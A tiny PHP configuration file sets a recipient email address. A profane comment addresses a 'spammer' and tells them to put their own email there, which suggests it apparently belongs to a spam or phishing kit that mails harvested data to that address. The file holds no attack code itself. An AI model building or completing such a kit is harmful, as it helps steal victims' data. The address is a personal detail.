<?php



//Hey u fucking spammer, put your fucking email here. I'm just kidding Lol.

$recipient = "chrisworks24hr@gmail.com"; 


?>